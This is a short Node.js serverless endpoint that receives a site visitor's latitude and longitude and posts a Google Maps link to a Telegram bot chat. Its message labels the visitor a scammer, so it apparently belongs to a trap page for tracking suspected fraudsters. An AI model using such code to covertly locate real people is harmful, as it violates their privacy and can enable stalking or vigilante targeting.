require('dotenv').config();
const axios = require('axios');

// Variáveis de ambiente
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

module.exports = async (req, res) => {
  if (req.method === 'POST') {
    const { latitude, longitude } = req.body;

    if (!latitude || !longitude) {
      return res.status(400).json({ message: 'Localização não fornecida' });
    }

    const message = `Golpista acessou o site. Localização: https://www.google.com/maps?q=${latitude},${longitude}`;

    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      });
      return res.status(200).json({ message: 'Localização recebida e enviada para o Telegram.' });
    } catch (error) {
      return res.status(500).json({ message: 'Erro ao enviar para o Telegram.' });
    }
  } else {
    return res.status(405).json({ message: 'Método não permitido' });
  }
};